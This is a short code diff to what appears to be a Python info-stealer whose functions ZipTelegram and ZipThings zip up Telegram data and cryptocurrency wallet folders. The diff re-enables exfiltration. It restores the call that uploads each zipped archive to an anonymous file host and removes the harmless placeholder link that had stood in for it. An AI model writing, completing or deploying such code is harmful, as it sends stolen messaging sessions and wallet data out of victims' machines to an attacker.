@@ -659,8 +659,8 @@ def ZipTelegram(path, arg, procc):
             zf.write(pathC + "/" + file)
     zf.close()
 
-    # lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
-    lnik = "https://google.com"
+    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
+    
     os.remove(f"{pathC}/{name}.zip")
     OtherZip.append([arg, lnik])
 
@@ -701,8 +701,8 @@ def ZipThings(path, arg, procc):
         if not ".zip" in file: zf.write(pathC + "/" + file)
     zf.close()
 
-    # lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
-    lnik = "https://google.com"
+    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
+    
     os.remove(f"{pathC}/{name}.zip")
 
     if "Wallet" in arg or "eogaeaoehlef" in arg:
